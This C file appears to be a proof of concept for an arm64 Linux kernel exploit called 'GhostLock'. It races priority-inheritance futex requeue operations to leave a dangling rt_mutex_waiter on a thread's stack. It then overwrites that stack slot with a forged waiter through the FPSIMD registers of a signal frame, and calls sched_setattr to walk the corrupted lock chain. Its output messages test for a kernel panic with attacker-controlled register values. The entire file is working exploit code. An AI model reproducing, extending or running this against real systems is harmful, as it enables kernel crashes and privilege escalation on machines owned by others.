#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <asm/sigcontext.h>
#include <stdatomic.h>

#ifndef FUTEX_LOCK_PI
#define FUTEX_LOCK_PI 6
#endif
#ifndef FUTEX_UNLOCK_PI
#define FUTEX_UNLOCK_PI 7
#endif
#ifndef FUTEX_WAIT_REQUEUE_PI
#define FUTEX_WAIT_REQUEUE_PI 11
#endif
#ifndef FUTEX_CMP_REQUEUE_PI
#define FUTEX_CMP_REQUEUE_PI 12
#endif

static uint32_t f_wait = 0;
static uint32_t f_pi_target = 0;
static uint32_t f_pi_chain = 0;
static atomic_int waiter_ready = 0;
static atomic_int waiter_waiting = 0;
static atomic_int owner_started = 0;
static atomic_int owner_chain_done = 0;
static atomic_int waiter_tid = 0;
static atomic_int punch_consume_go = 0;
static atomic_int consumer_calls = 0;
static volatile int sigreturn_done = 0;

/* Marker pattern: "FPSIMD000" ... "FPSIMD009" */
static uint64_t g_markers[10] = {
    0x465053494d440000, 0x465053494d440001,
    0x465053494d440002, 0x465053494d440003,
    0x465053494d440004, 0x465053494d440005,
    0x465053494d440006, 0x465053494d440007,
    0x465053494d440008, 0x465053494d440009,
};

static void sigreturn_handler(int sig, siginfo_t *info, void *ucontext)
{
    (void)sig; (void)info;
    ucontext_t *uc = (ucontext_t *)ucontext;
    mcontext_t *mc = &uc->uc_mcontext;
    unsigned char *base = (unsigned char *)mc;

    for (int off = 0; off < 2048; off += 8) {
        uint32_t magic = *(uint32_t *)(base + off);
        if (magic == FPSIMD_MAGIC) {
            struct fpsimd_context *fpsimd = (struct fpsimd_context *)(base + off);
            uint8_t *vregs = (uint8_t *)&fpsimd->vregs[0];
            
            /* Write 10 marker qwords starting at vregs[0] */
            memcpy(vregs, g_markers, sizeof(g_markers));
            
            /* Also write a "safe" fake waiter at offset 0x18 for later test */
            /* tree_parent = 1, tree_right = 0, tree_left = 0 */
            /* pi_parent = 0xdeadbeefcafe0001, pi_right = 0, pi_left = 0 */
            /* task = 0xdeadbeefcafe0002, lock = 0xdeadbeefcafe0003 */
            memset(vregs + 0x18, 0, 0x58);
            *(uint64_t *)(vregs + 0x18 + 0x00) = 1;                       /* tree_parent */
            *(uint64_t *)(vregs + 0x18 + 0x30) = 0xdeadbeefcafe0002ULL;  /* task */
            *(uint64_t *)(vregs + 0x18 + 0x38) = 0xdeadbeefcafe0003ULL;  /* lock */
            *(uint32_t *)(vregs + 0x18 + 0x44) = 3;                       /* prio */
            
            sigreturn_done = 1;
            return;
        }
    }
    printf("[!] FPSIMD context not found in signal frame!\n");
}

static long futex(uint32_t *uaddr, int op, uint32_t val,
                  const struct timespec *timeout, uint32_t *uaddr2, uint32_t val3)
{
    return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

static void *owner_thread(void *arg)
{
    (void)arg;
    if (futex(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
        perror("owner lock target");
        return NULL;
    }
    while (!atomic_load(&waiter_ready)) usleep(1000);
    atomic_store(&owner_started, 1);
    futex(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    atomic_store(&owner_chain_done, 1);
    for (;;) sleep(1);
    return NULL;
}

static void *consumer_thread(void *arg)
{
    (void)arg;
    int seen = 0;
    while (1) {
        int seq = atomic_load(&punch_consume_go);
        if (seq == 0 || seq == seen) {
            __asm__ volatile("yield" ::: "memory");
            continue;
        }
        seen = seq;
        int tid = atomic_load(&waiter_tid);
        if (tid <= 0) continue;
        
        atomic_fetch_add(&consumer_calls, 1);
        /* sched_setattr with nice=0 to trigger rt_mutex_adjust_prio_chain */
        struct {
            uint32_t size;
            uint32_t sched_policy;
            uint64_t sched_flags;
            int32_t sched_nice;
            uint32_t sched_priority;
            uint64_t sched_runtime;
            uint64_t sched_deadline;
            uint64_t sched_period;
            uint32_t sched_util_min;
            uint32_t sched_util_max;
        } attr = {
            .size = sizeof(attr),
            .sched_policy = 0, /* SCHED_NORMAL */
            .sched_nice = 0,
        };
        syscall(SYS_sched_setattr, tid, &attr, 0);
    }
    return NULL;
}

static void *waiter_thread(void *arg)
{
    (void)arg;
    int tid = (int)syscall(SYS_gettid);
    atomic_store(&waiter_tid, tid);

    /* Setup signal handler */
    struct sigaction sa = {0};
    sa.sa_sigaction = sigreturn_handler;
    sa.sa_flags = SA_SIGINFO | SA_RESTART;
    sigaction(SIGUSR1, &sa, NULL);

    /* Lock PI chain first (creates rt_mutex_waiter on stack) */
    if (futex(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
        perror("waiter lock chain");
        return NULL;
    }

    atomic_store(&waiter_ready, 1);
    while (!atomic_load(&owner_started)) usleep(1000);

    struct timespec timeout;
    clock_gettime(CLOCK_MONOTONIC, &timeout);
    timeout.tv_sec += 10;

    atomic_store(&waiter_waiting, 1);
    futex(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);

    /* At this point we have a dangling waiter on our stack */
    printf("[*] Waiter requeued, sending SIGUSR1 to self...\n");
    
    sigreturn_done = 0;
    syscall(SYS_tgkill, getpid(), tid, SIGUSR1);
    
    while (!sigreturn_done) sched_yield();
    printf("[*] sigreturn completed, waiter should be overwritten\n");

    /* Now trigger consumer to call sched_setattr */
    atomic_store(&punch_consume_go, 1);
    
    /* Wait a bit for consumer */
    usleep(500000);
    
    printf("[*] Test complete. If kernel panicked with x27=0xdeadbeefcafe0003 -> FPSIMD overlap works!\n");
    printf("[*] If panicked with x27=0 -> overlap failed or SVE path taken.\n");
    printf("[*] Check dmesg for the panic details.\n");
    
    /* Keep thread alive */
    for (;;) sleep(1);
    return NULL;
}

int main()
{
    printf("[*] GhostLock + rt_sigreturn FPSIMD overlap test\n");
    printf("[*] Watch dmesg for panic in parallel!\n");

    /* Initialize futexes for PI */
    futex(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    futex(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    futex(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    futex(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);

    pthread_t t_owner, t_waiter, t_consumer;
    pthread_create(&t_owner, NULL, owner_thread, NULL);
    pthread_create(&t_waiter, NULL, waiter_thread, NULL);
    pthread_create(&t_consumer, NULL, consumer_thread, NULL);

    /* Wait for setup */
    while (!atomic_load(&waiter_waiting)) usleep(1000);
    usleep(100000);

    /* Trigger requeue */
    futex(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);

    pthread_join(t_waiter, NULL);
    return 0;
}